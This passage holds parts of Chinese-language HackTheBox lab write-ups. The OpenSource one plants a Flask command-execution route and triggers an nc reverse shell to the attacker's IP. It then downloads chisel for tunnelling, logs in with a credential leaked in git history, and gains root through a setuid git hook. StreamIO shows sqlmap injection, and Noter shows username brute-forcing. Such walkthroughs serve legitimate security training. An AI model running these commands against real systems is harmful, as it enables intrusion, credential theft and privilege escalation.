">\\n<html>\\n\\x2\nSF:0\\x20\\x20\\x20<head>\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20<meta\\x20http-equi\nSF:v=\\\"Content-Type\\\"\\x20content=\\\"text/html;charset=utf-8\\\">\\n\\x20\\x20\\x2\nSF:0\\x20\\x20\\x20\\x20\\x20<title>Error\\x20response</title>\\n\\x20\\x20\\x20\\x20\nSF:</head>\\n\\x20\\x20\\x20\\x20<body>\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20<h1>Er\nSF:ror\\x20response</h1>\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20<p>Error\\x20code:\nSF:\\x20400</p>\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20<p>Message:\\x20Bad\\x20requ\nSF:est\\x20version\\x20\\('RTSP/1\\.0'\\)\\.</p>\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x\nSF:20<p>Error\\x20code\\x20explanation:\\x20HTTPStatus\\.BAD_REQUEST\\x20-\\x20B\nSF:ad\\x20request\\x20syntax\\x20or\\x20unsupported\\x20method\\.</p>\\n\\x20\\x20\\\nSF:x20\\x20</body>\\n</html>\\n\");\nNo exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).\nTCP/IP fingerprint:\nOS:SCAN(V=7.91%E=4%D=6/6%OT=22%CT=1%CU=35351%PV=Y%DS=2%DC=T%G=Y%TM=629DA462\nOS:%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=10C%TI=Z%CI=Z%II=I%TS=A)OPS(\nOS:O1=M505ST11NW7%O2=M505ST11NW7%O3=M505NNT11NW7%O4=M505ST11NW7%O5=M505ST11\nOS:NW7%O6=M505ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(\nOS:R=Y%DF=Y%T=40%W=FAF0%O=M505NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS\nOS:%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=\nOS:Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=\nOS:R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T\nOS:=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=\nOS:S)\n\nNetwork Distance: 2 hops\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nTRACEROUTE (using port 199/tcp)\nHOP RTT       ADDRESS\n1   176.47 ms 10.10.14.1\n2   177.14 ms 10.10.11.164\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 249.84 seconds\n```\n## Http\n![](Hackthebox-OpenSource/53df5e0c-6b49-41b0-8ece-96a499608f89.png)\n\n似乎是一个什么云平台，根据 Nmap 扫描到的结果 Werkzeug/2.1.2 进行搜索，找到了一个路径 /console \n\n![](Hackthebox-OpenSource/9ea9f6d0-14d8-4935-aea8-8aaa5406a270.png)\n\n但是测试了一下，网络上提到的以及 MSF 内的 exp 都没有成功\n\n![](Hackthebox-OpenSource/4eacb2fb-9457-4f89-b102-abcf251f58d8.png)\n\n主页有一个文件可以下载，下载后进行解压\n\n```bash\n┌──(root💀kali)-[~/Desktop/source/app/app]\n└─# cat views.py \nimport os\n\nfrom app.utils import get_file_name\nfrom flask import render_template, request, send_file\n\nfrom app import app\n\n@app.route('/', methods=['GET', 'POST'])\ndef upload_file():\n    if request.method == 'POST':\n        f = request.files['file']\n        file_name = get_file_name(f.filename)\n        file_path = os.path.join(os.getcwd(), \"public\", \"uploads\", file_name)\n        f.save(file_path)\n        return render_template('success.html', file_url=request.host_url + \"uploads/\" + file_name)\n    return render_template('upload.html')\n\n@app.route('/uploads/<path:path>')\ndef send_report(path):\n    path = get_file_name(path)\n    return send_file(os.path.join(os.getcwd(), \"public\", \"uploads\", path))\n```\n在 /source/app/app/views.py 中看到点有趣的内容，[http://10.10.11.164/upcloud](http://10.10.11.164/upcloud) 然后这边还有一个上传点。\n\n那么我们是否可以伪造 [views.py](http://views.py) 的内容，然后传上去获得利用呢？\n\n# 漏洞利用\n```bash\n@app.route('/exec')\ndef cmd():\n    return os.system(request.args.get('cmd'))\n```\n在 [views.py](http://views.py) 的最后加上这么一句，然后去上传，使用 burp 进行抓包，然后把我们修改的内容加进去\n\n![](Hackthebox-OpenSource/89238808-9963-4de7-8f83-73df9aa7973d.png)\n\n![](Hackthebox-OpenSource/d5b9c976-687a-413b-aacf-348b880fcfc4.png)\n\n传上去后查看一下\n\n![](Hackthebox-OpenSource/bb34b0fc-d27f-4f2a-8808-e3b808875f95.png)\n\n确定是已经传上去了\n\n但是无法访问和执行，我们去修改一下路径试试\n\n![](Hackthebox-OpenSource/62cae123-7c42-4a93-aec4-06a016e0dcad.png)\n\n![](Hackthebox-OpenSource/c00b900c-95ac-4b2e-8c7d-4f7e9350cf71.png)\n\n似乎是被 WAF 给拦截了，尝试绕过一下\n\n![](Hackthebox-OpenSource/7764758b-ebb1-4eba-ad1f-5b0b3d573e67.png)\n\n![](Hackthebox-OpenSource/5e590cd3-af9c-4edd-8a40-095895779953.png)\n\n然后就成功了，去访问一下吧\n\n使用 nc 监听一个端口\n\n然后访问我们的 webshell\n\n```bash\nhttp://10.10.11.164/exec?cmd=rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff|%2Fbin%2Fsh%20-i%202%3E%261|nc%2010.10.14.33%204444%20%3E%2Ftmp%2Ff\n```\n就得到了一个 shell\n\n```bash\n┌──(root💀kali)-[~/Desktop]\n└─# nc -nvlp 4444\nlistening on [any] 4444 ...\nconnect to [10.10.14.33] from (UNKNOWN) [10.10.11.164] 41083\n/bin/sh: can't access tty; job control turned off\n/app # whoami&&id\nroot\nuid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)\n```\n```bash\n/app # ifconfig\neth0      Link encap:Ethernet  HWaddr 02:42:AC:11:00:03  \n          inet addr:172.17.0.3  Bcast:172.17.255.255  Mask:255.255.0.0\n          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1\n          RX packets:8217 errors:0 dropped:0 overruns:0 frame:0\n          TX packets:4351 errors:0 dropped:0 overruns:0 carrier:0\n          collisions:0 txqueuelen:0 \n          RX bytes:595585 (581.6 KiB)  TX bytes:1844757 (1.7 MiB)\n\nlo        Link encap:Local Loopback  \n          inet addr:127.0.0.1  Mask:255.0.0.0\n          UP LOOPBACK RUNNING  MTU:65536  Metric:1\n          RX packets:0 errors:0 dropped:0 overruns:0 frame:0\n          TX packets:0 errors:0 dropped:0 overruns:0 carrier:0\n          collisions:0 txqueuelen:1000 \n          RX bytes:0 (0.0 B)  TX bytes:0 (0.0 B)\n```\n看着不太对，感觉像是在 docker 里\n\n```bash\n/home # ls -la /\ntotal 72\ndrwxr-xr-x    1 root     root          4096 Jun  6 08:06 .\ndrwxr-xr-x    1 root     root          4096 Jun  6 08:06 ..\n-rwxr-xr-x    1 root     root             0 Jun  6 08:06 .dockerenv\ndrwxr-xr-x    1 root     root          4096 May  4 16:35 app\ndrwxr-xr-x    1 root     root          4096 Mar 17 05:52 bin\ndrwxr-xr-x    5 root     root           340 Jun  6 08:06 dev\ndrwxr-xr-x    1 root     root          4096 Jun  6 08:06 etc\ndrwxr-xr-x    2 root     root          4096 May  4 16:35 home\ndrwxr-xr-x    1 root     root          4096 May  4 16:35 lib\ndrwxr-xr-x    5 root     root          4096 May  4 16:35 media\ndrwxr-xr-x    2 root     root          4096 May  4 16:35 mnt\ndrwxr-xr-x    2 root     root          4096 May  4 16:35 opt\ndr-xr-xr-x  233 root     root             0 Jun  6 08:06 proc\ndrwx------    1 root     root          4096 May  4 16:35 root\ndrwxr-xr-x    1 root     root          4096 Jun  6 08:06 run\ndrwxr-xr-x    1 root     root          4096 Mar 17 05:52 sbin\ndrwxr-xr-x    2 root     root          4096 May  4 16:35 srv\ndr-xr-xr-x   13 root     root             0 Jun  6 08:06 sys\ndrwxrwxrwt    1 root     root          4096 Jun  6 13:33 tmp\ndrwxr-xr-x    1 root     root          4096 May  4 16:35 usr\ndrwxr-xr-x    1 root     root          4096 May  4 16:35 var\n```\n确实是在 docker 里\n\n# 虚拟机逃逸\n> [https://github.com/jpillora/chisel](https://github.com/jpillora/chisel)\n\n这边使用 chisel 来进行逃逸，我们先想办法给弄到靶机里\n\n```bash\n/dev/shm # wget http://10.10.14.33:8000/chisel\nConnecting to 10.10.14.33:8000 (10.10.14.33:8000)\nsaving to 'chisel'\nchisel                 2% |                                |  178k  0:00:43 ETA\nchisel                26% |********                        | 2075k  0:00:05 ETA\nchisel                39% |************                    | 3110k  0:00:04 ETA\nchisel                53% |*****************               | 4202k  0:00:03 ETA\nchisel                69% |**********************          | 5495k  0:00:02 ETA\nchisel                81% |**************************      | 6462k  0:00:01 ETA\nchisel                92% |*****************************   | 7327k  0:00:00 ETA\nchisel               100% |********************************| 7888k  0:00:00 ETA\n'chisel' saved\n```\n```bash\n/dev/shm # ls\nchisel\n/dev/shm # ./chisel\n/bin/sh: ./chisel: Permission denied\n/dev/shm # ls -la\ntotal 7888\ndrwxrwxrwt    2 root     root            60 Jun  6 13:47 .\ndrwxr-xr-x    5 root     root           340 Jun  6 08:06 ..\n-rw-r--r--    1 root     root       8077312 Jun  6 13:46 chisel\n/dev/shm # chmod 777 chisel\n/dev/shm # ./chisel\n/bin/sh: ./chisel: Permission denied\n```\n可以看到，在 /dev/shm 是没有执行权限的，即使给了权限也无法执行\n\n```bash\n/dev/shm # mv chisel /app\n/dev/shm # cd /app\n/app # ls\nINSTALL.md\napp\nchisel\npublic\nrun.py\n/app # ./chisel\n\n  Usage: chisel [command] [--help]\n\n  Version: 1.7.7 (go1.17.6)\n\n  Commands:\n    server - runs chisel in server mode\n    client - runs chisel in client mode\n\n  Read more:\n    https://github.com/jpillora/chisel\n```\n变通一下，换个位置就可以执行了\n\n这边给出提示了，我们去开启一个 socks5 通道吧\n\n```bash\n本地\n./chisel server --reverse --port 6969\n\n靶机\n./chisel client 10.10.14.33:6969 R:172.17.0.1:3000\n```\n```bash\n本机\n┌──(root💀kali)-[~/Desktop]\n└─# ./chisel server --reverse --port 6969\n2022/06/06 22:03:03 server: Reverse tunnelling enabled\n2022/06/06 22:03:03 server: Fingerprint eok9TFfTK+YpN31Xcx/GZgBfBuElFqfn/SWgZD8lLLU=\n2022/06/06 22:03:03 server: Listening on http://0.0.0.0:6969\n2022/06/06 22:11:28 server: session#1: tun: proxy#R:3000=>172.17.0.1:3000: Listening\n\n靶机\n/app # ./chisel client 10.10.16.2:6969 R:172.17.0.1:3000\n2022/06/07 02:11:23 client: Connecting to ws://10.10.16.2:6969\n2022/06/07 02:11:27 client: Connected (Latency 276.641246ms)\n```\n![](Hackthebox-OpenSource/b87b90ff-aeeb-44d6-bfd2-f69fc707a039.png)\n\n然后访问 127.0.0.1:3000 成功访问\n\n![](Hackthebox-OpenSource/6c1a8fb0-ca71-434c-8659-4d8cc4f58784.png)\n\n注册一个账户登入后，在探索的用户里发现有一个名为 dev01 的用户\n\n```bash\ngit show-branch\ngit log dev --oneline\ngit show a76f8f7\n```\n使用以上三条命令获取我们要的账户密码\n\n```bash\n┌──(root💀kali)-[~/Desktop/source]\n└─# git show-branch                                                                                                                       1 ⚙\n! [dev] ease testing\n * [public] clean up dockerfile for production use\n--\n * [public] clean up dockerfile for production use\n+  [dev] ease testing\n+  [dev^] added gitignore\n+  [dev~2] updated\n+* [public^] initial\n\n┌──(root💀kali)-[~/Desktop/source]\n└─# git log dev --oneline                                                                                                                 1 ⚙\nc41fede (dev) ease testing\nbe4da71 added gitignore\na76f8f7 updated\nee9d9f1 initial\n\n┌──(root💀kali)-[~/Desktop/source]\n└─# git show a76f8f7                                                                                                                      1 ⚙\ncommit a76f8f75f7a4a12b706b0cf9c983796fa1985820\nAuthor: gituser <gituser@local>\nDate:   Thu Apr 28 13:46:16 2022 +0200\n\n    updated\n\ndiff --git a/app/.vscode/settings.json b/app/.vscode/settings.json\nnew file mode 100644\nindex 0000000..5975e3f\n--- /dev/null\n+++ b/app/.vscode/settings.json\n@@ -0,0 +1,5 @@\n+{\n+  \"python.pythonPath\": \"/home/dev01/.virtualenvs/flask-app-b5GscEs_/bin/python\",\n+  \"http.proxy\": \"http://dev01:Soulless_Developer#2022@10.10.10.128:5187/\",\n+  \"http.proxyStrictSSL\": false\n+}\ndiff --git a/app/app/views.py b/app/app/views.py\nindex f2744c6..0f3cc37 100644\n--- a/app/app/views.py\n+++ b/app/app/views.py\n@@ -6,7 +6,17 @@ from flask import render_template, request, send_file\n from app import app\n\n\n-@app.route('/', methods=['GET', 'POST'])\n+@app.route('/')\n+def index():\n+    return render_template('index.html')\n+\n+\n+@app.route('/download')\n+def download():\n+    return send_file(os.path.join(os.getcwd(), \"app\", \"static\", \"source.zip\"))\n+\n+\n+@app.route('/upcloud', methods=['GET', 'POST'])\n def upload_file():\n     if request.method == 'POST':\n         f = request.files['file']\n@@ -20,4 +30,4 @@ def upload_file():\n @app.route('/uploads/<path:path>')\n def send_report(path):\n     path = get_file_name(path)\n-    return send_file(os.path.join(os.getcwd(), \"public\", \"uploads\", path))\n\\ No newline at end of file\n+    return send_file(os.path.join(os.getcwd(), \"public\", \"uploads\", path))\n```\n得到了账号密码\n\n```bash\nusername = dev01\npassword = Soulless_Developer#2022\n```\n然后去登陆一下 Gitea\n\n![](Hackthebox-OpenSource/96489c0c-ef30-431f-afab-06a6a77fe0ae.png)\n\n登陆成功\n\n这边有一个 home-backup 项目，去看看\n\n![](Hackthebox-OpenSource/748621f0-c7b2-421c-a780-cdd3e37fef55.png)\n\n在里面发现了一个 .ssh 文件夹，看看能不能找到 ssh-key\n\n![](Hackthebox-OpenSource/069e2c21-40b0-4fde-a9ec-6834a2342426.png)\n\nNice 找到了 ssh-key 直接去尝试连接 ssh\n\n```bash\n┌──(root💀kali)-[~/Desktop]\n└─# ssh dev01@10.10.11.164 -i id_rsa\nThe authenticity of host '10.10.11.164 (10.10.11.164)' can't be established.\nECDSA key fingerprint is SHA256:a6VljAI6pLD7/108ls+Bi5y88kWaYI6+V4lTU0KQsQU.\nAre you sure you want to continue connecting (yes/no/[fingerprint])? yes\nWarning: Permanently added '10.10.11.164' (ECDSA) to the list of known hosts.\nWelcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-176-generic x86_64)\n\n * Documentation:  https://help.ubuntu.com\n * Management:     https://landscape.canonical.com\n * Support:        https://ubuntu.com/advantage\n\n  System information as of Tue Jun  7 03:07:46 UTC 2022\n\n  System load:  0.0               Processes:              241\n  Usage of /:   75.0% of 3.48GB   Users logged in:        0\n  Memory usage: 22%               IP address for eth0:    10.10.11.164\n  Swap usage:   0%                IP address for docker0: 172.17.0.1\n\n\n16 updates can be applied immediately.                                                                                                        \n9 of these updates are standard security updates.                                                                                             \nTo see these additional updates run: apt list --upgradable                                                                                    \n\n\nLast login: Mon May 16 13:13:33 2022 from 10.10.14.23                                                                                         \ndev01@opensource:~$ whoami&&id                                                                                                                \ndev01                                                                                                                                         \nuid=1000(dev01) gid=1000(dev01) groups=1000(dev01)\n```\n成功逃逸出来\n\n```bash\ndev01@opensource:~$ ls                                                                                                                        \nuser.txt                                                                                                                                      \ndev01@opensource:~$ cat user.txt \n80fc1f5f07080181febb1098b2c7070c\n```\n成功拿到 user 权限的 flag 文件\n\n# 权限提升\n```bash\ndev01@opensource:~$ ls -la\ntotal 44\ndrwxr-xr-x 7 dev01 dev01 4096 May 16 12:51 .\ndrwxr-xr-x 4 root  root  4096 May 16 12:51 ..\nlrwxrwxrwx 1 dev01 dev01    9 Mar 23 01:21 .bash_history -> /dev/null\n-rw-r--r-- 1 dev01 dev01  220 Apr  4  2018 .bash_logout\n-rw-r--r-- 1 dev01 dev01 3771 Apr  4  2018 .bashrc\ndrwx------ 2 dev01 dev01 4096 May  4 16:35 .cache\ndrwxrwxr-x 8 dev01 dev01 4096 Jun  7 03:09 .git\ndrwx------ 3 dev01 dev01 4096 May  4 16:35 .gnupg\ndrwxrwxr-x 3 dev01 dev01 4096 May  4 16:35 .local\n-rw-r--r-- 1 dev01 dev01  807 Apr  4  2018 .profile\ndrwxr-xr-x 2 dev01 dev01 4096 May  4 16:35 .ssh\n-rw-r----- 1 root  dev01   33 Jun  7 01:50 user.txt\ndev01@opensource:~$ cd .git\ndev01@opensource:~/.git$ ls -la\ntotal 56\ndrwxrwxr-x  8 dev01 dev01 4096 Jun  7 03:09 .\ndrwxr-xr-x  7 dev01 dev01 4096 May 16 12:51 ..\ndrwxrwxr-x  2 dev01 dev01 4096 May  4 16:35 branches\n-rw-r--r--  1 dev01 dev01   22 Jun  7 03:09 COMMIT_EDITMSG\n-rw-rw-r--  1 dev01 dev01  269 Jun  7 03:08 config\n-rw-rw-r--  1 dev01 dev01   73 Mar 23 01:18 description\n-rw-rw-r--  1 dev01 dev01  117 Mar 23 01:19 FETCH_HEAD\n-rw-r--r--  1 dev01 dev01   21 May 16 12:50 HEAD\ndrwxrwxr-x  2 dev01 dev01 4096 May  4 16:35 hooks\n-rw-r--r--  1 root  root   845 Jun  7 01:51 index\ndrwxrwxr-x  2 dev01 dev01 4096 May  4 16:35 info\ndrwxr-xr-x  3 dev01 dev01 4096 May  4 16:35 logs\ndrwxrwxr-x 44 dev01 dev01 4096 Jun  7 01:51 objects\ndrwxrwxr-x  5 dev01 dev01 4096 May  4 16:35 refs\n```\n这边可以根据之前的文件来猜测，可能存在 .git/hooks 文件夹，查看了一下确实存在，我们进去看看\n\n```bash\ndev01@opensource:~/.git/hooks$ cat pre-commit.sample \n#!/bin/sh\n#\n# An example hook script to verify what is about to be committed.\n# Called by \"git commit\" with no arguments.  The hook should\n# exit with non-zero status after issuing an appropriate message if\n# it wants to stop the commit.\n#\n# To enable this hook, rename this file to \"pre-commit\".\n\nif git rev-parse --verify HEAD >/dev/null 2>&1\nthen\n        against=HEAD\nelse\n        # Initial commit: diff against an empty tree object\n        against=4b825dc642cb6eb9a060e54bf8d69288fbee4904\nfi\n\n# If you want to allow non-ASCII filenames set this variable to true.\nallownonascii=$(git config --bool hooks.allownonascii)\n\n# Redirect output to stderr.\nexec 1>&2\n\n# Cross platform projects tend to avoid non-ASCII filenames; prevent\n# them from being added to the repository. We exploit the fact that the\n# printable range starts at the space character and ends with tilde.\nif [ \"$allownonascii\" != \"true\" ] &&\n        # Note that the use of brackets around a tr range is ok here, (it's\n        # even required, for portability to Solaris 10's /usr/bin/tr), since\n        # the square bracket bytes happen to fall in the designated range.\n        test $(git diff --cached --name-only --diff-filter=A -z $against |\n          LC_ALL=C tr -d '[ -~]\\0' | wc -c) != 0\nthen\n        cat <<\\EOF\nError: Attempt to add a non-ASCII file name.\n\nThis can cause problems if you want to work with people on other platforms.\n\nTo be portable it is advisable to rename the file.\n\nIf you know what you are doing you can disable this check using:\n\n  git config hooks.allownonascii true\nEOF\n        exit 1\nfi\n\n# If there are whitespace errors, print the offending file names and fail.\nexec git diff-index --check --cached $against --\n```\npre-commit.sample 文件看起来很有希望啊？让我们稍稍的修改一下\n\n我们将 chmod u+s /bin/bash 添加到 pre-commit.sample 的 #!/bn/bash 一行下\n\n![](Hackthebox-OpenSource/1a0a0504-eadb-4c09-9cf9-cca79b391d3b.png)\n\n接着将 pre-commit.sample 文件名改为 pre-commit\n\n```bash\ndev01@opensource:~/.git/hooks$ /bin/bash -p\nbash-4.4# whoami&&id\nroot\nuid=1000(dev01) gid=1000(dev01) euid=0(root) groups=1000(dev01)\n```\n然后进行利用，成功踢拳道 root 权限\n\n```bash\nbash-4.4# cat /root/root.txt\nb6936fa688d43c9d1cc68e6c0fd1971e\n```\n成功获得 root 权限的 flag 文件","tags":["Hackthebox"]},{"title":"StreamIO - Hackthebox","url":"/2022/06/04/Hackthebox/Medium/Hackthebox-StreamIO/","content":"\n# Hackthebox - StreamIO\n# 靶场信息\n![image](Hackthebox-StreamIO/a359c61f-cba2-4888-9bce-7163a14523f4.png)\n\n# 靶场类型\n![image](Hackthebox-StreamIO/571e549b-aee6-4799-bde8-f3a5c9a87e92.png)\n\n# 信息收集\n## Nmap\n```bash\n┌──(root㉿lucifiel)-[~/Desktop]\n└─# nmap -sS -sC -sV -A -p- -min-rate 5000 10.10.11.158\nStarting Nmap 7.92 ( https://nmap.org ) at 2022-06-17 13:41 CST\nNmap scan report for 10.10.11.158\nHost is up (0.69s latency).\nNot shown: 65515 filtered tcp ports (no-response)\nPORT      STATE SERVICE       VERSION\n53/tcp    open  domain        Simple DNS Plus\n80/tcp    open  http          Microsoft IIS httpd 10.0\n|_http-server-header: Microsoft-IIS/10.0\n| http-methods: \n|_  Potentially risky methods: TRACE\n|_http-title: IIS Windows Server\n88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2022-06-17 12:42:04Z)\n135/tcp   open  msrpc         Microsoft Windows RPC\n139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn\n389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: streamIO.htb0., Site: Default-First-Site-Name)\n443/tcp   open  ssl/http      Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\n| tls-alpn: \n|_  http/1.1\n|_http-server-header: Microsoft-HTTPAPI/2.0\n|_http-title: Not Found\n|_ssl-date: 2022-06-17T12:44:06+00:00; +7h00m00s from scanner time.\n| ssl-cert: Subject: commonName=streamIO/countryName=EU\n| Subject Alternative Name: DNS:streamIO.htb, DNS:watch.streamIO.htb\n| Not valid before: 2022-02-22T07:03:28\n|_Not valid after:  2022-03-24T07:03:28\n445/tcp   open  microsoft-ds?\n464/tcp   open  kpasswd5?\n593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0\n636/tcp   open  tcpwrapped\n3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: streamIO.htb0., Site: Default-First-Site-Name)\n3269/tcp  open  tcpwrapped\n5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\n|_http-server-header: Microsoft-HTTPAPI/2.0\n|_http-title: Not Found\n9389/tcp  open  mc-nmf        .NET Message Framing\n49667/tcp open  msrpc         Microsoft Windows RPC\n49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0\n49674/tcp open  msrpc         Microsoft Windows RPC\n49701/tcp open  msrpc         Microsoft Windows RPC\n49964/tcp open  msrpc         Microsoft Windows RPC\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nOS fingerprint not ideal because: Missing a closed TCP port so results incomplete\nNo OS matches for host\nNetwork Distance: 2 hops\nService Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows\n\nHost script results:\n| smb2-security-mode: \n|   3.1.1: \n|_    Message signing enabled and required\n|_clock-skew: mean: 6h59m59s, deviation: 0s, median: 6h59m59s\n| smb2-time: \n|   date: 2022-06-17T12:43:25\n|_  start_date: N/A\n\nTRACEROUTE (using port 135/tcp)\nHOP RTT       ADDRESS\n1   831.08 ms 10.10.16.1\n2   831.12 ms 10.10.11.158\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 184.57 seconds\n```\n## Http\n![image](Hackthebox-StreamIO/7f6d5482-1245-4af2-87b3-7eb6c08280fc.png)\n\n80 端口就是一个 iis 默认页面，没什么东西\n\n## Https\n![image](Hackthebox-StreamIO/7cb81489-c2af-4a56-a789-49f9918c9d0e.png)\n\nhttps 页面会报错，我往回看了一下，有两个 DNS \n\n```bash\nDNS:streamIO.htb, DNS:watch.streamIO.htb\n```\n我们给添加到 hosts 中\n\n```bash\necho 10.10.11.158 streamIO.htb watch.streamIO.htb >> /etc/hosts\n```\n然后去访问一下 https://streamIO.htb/\n\n![image](Hackthebox-StreamIO/e1550ea9-be81-4a6f-8e71-e9f7c72aa7bf.png)\n\n这边有一个登录页面\n\n![image](Hackthebox-StreamIO/bc66f23a-adde-47e5-a8b8-a5a14631456e.png)\n\n猜测可能是有注入，去尝试一下\n\n# 漏洞利用\n## SQL 注入\n```bash\n┌──(root💀lucifiel)-[~/Desktop]\n└─# sqlmap -u \"https://streamIO.htb/login.php\" --method POST --data \"username=FUZZ&password=FUZZ\" --dbs\n\navailable databases [5]:\n[*] model\n[*] msdb\n[*] STREAMIO\n[*] streamio_backup\n[*] tempdb\n```\n确实有个时间注入，不过是真的慢，我就直接放结果了\n\n```bash\n┌──(root💀lucifiel)-[~/Desktop]\n└─# sqlmap -u \"https://streamIO.htb/login.php\" --method POST --data \"username=FUZZ&password=FUZZ\" --batch -D STREAMIO -T users -C username,password --dump\n\n```","tags":["Hackthebox"]},{"title":"Noter - Hackthebox","url":"/2022/05/22/Hackthebox/Medium/Hackthebox-Noter/","content":"\n# Hackthebox - Noter\n# 靶场信息\n![](Hackthebox-Noter/49242766-f992-44fc-9135-7949fb2c6022.png)\n\n# 靶场类型\n![](Hackthebox-Noter/ea52bbc7-29c8-4f95-a033-7cab8f2bef09.png)\n\n# 信息收集\n## Nmap\n```bash\n┌──(root💀kali)-[~/Desktop]\n└─# nmap -sS -A -sC -sV -p- --min-rate 5000 10.10.11.160\nStarting Nmap 7.91 ( https://nmap.org ) at 2022-05-22 02:50 EDT\nNmap scan report for 10.10.11.160\nHost is up (0.12s latency).\nNot shown: 65532 closed ports\nPORT     STATE SERVICE VERSION\n21/tcp   open  ftp     vsftpd 3.0.3\n22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   3072 c6:53:c6:2a:e9:28:90:50:4d:0c:8d:64:88:e0:08:4d (RSA)\n|   256 5f:12:58:5f:49:7d:f3:6c:bd:9b:25:49:ba:09:cc:43 (ECDSA)\n|_  256 f1:6b:00:16:f7:88:ab:00:ce:96:af:a6:7e:b5:a8:39 (ED25519)\n5000/tcp open  http    Werkzeug httpd 2.0.2 (Python 3.8.10)\n|_http-title: Noter\nNo exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).\nTCP/IP fingerprint:\nOS:SCAN(V=7.91%E=4%D=5/22%OT=21%CT=1%CU=41426%PV=Y%DS=2%DC=T%G=Y%TM=6289DD5\nOS:D%P=x86_64-pc-linux-gnu)SEQ(SP=104%GCD=1%ISR=10A%TI=Z%CI=Z%II=I%TS=A)OPS\nOS:(O1=M505ST11NW7%O2=M505ST11NW7%O3=M505NNT11NW7%O4=M505ST11NW7%O5=M505ST1\nOS:1NW7%O6=M505ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN\nOS:(R=Y%DF=Y%T=40%W=FAF0%O=M505NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A\nOS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R\nOS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F\nOS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%\nOS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD\nOS:=S)\n\nNetwork Distance: 2 hops\nService Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel\n\nTRACEROUTE (using port 3389/tcp)\nHOP RTT       ADDRESS\n1   126.10 ms 10.10.14.1\n2   126.30 ms 10.10.11.160\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 39.63 seconds\n```\n## Http\n![](Hackthebox-Noter/7dbe01f0-60f6-4e5a-920c-53842065ecc1.png)\n\n正如名字记录，这是一台笔记相关的靶机\n\n![](Hackthebox-Noter/e62c4c4e-800d-4910-af2a-133e3971cd73.png)\n\n这里用 Wappalyzer 可以看到是一台 Flask 相关的靶机\n\n![](Hackthebox-Noter/24094af1-07c1-4ddb-ad25-d6136d66519b.png)\n\n直接登陆提示的是 `Invalid credentials` ，这里也有注册口，先去注册个账号看看\n\n![](Hackthebox-Noter/f34d5587-7133-429e-907f-0b41e97ed59e.png)\n\n![](Hackthebox-Noter/718e7b0b-4fbe-4cb5-abdf-2b0537ce5738.png)\n\n注册一个账号后，使用错误的密码登陆，提示的是 `Invalid login` ，那就意味着用户名可以被爆破，在抓继续查看的同时，我们先去爆破用户名看看\n\n使用用户名字典 /usr/share/seclists/Usernames/cirt-default-usernames.txt，然后使用 Burp 抓包进行爆破\n\n![](Hackthebox-Noter/77f4c3ac-9bd0-4c0b-a800-77e6fb4289a9.png)\n\n最后得到了一个用户名 blue\n\n然后使用我们注册的账户进行登陆\n\n![](Hackthebox-Noter/5affb9ec-0cce-4e71-addc-0854e5d4e141.png)\n\n倒是没看到什么有用的东西\n\n![](Hackthebox-Noter/82860798-7702-4c98-a8a3-8a448bc11f59.png)\n\ncookie 处 发现了一个 JWT 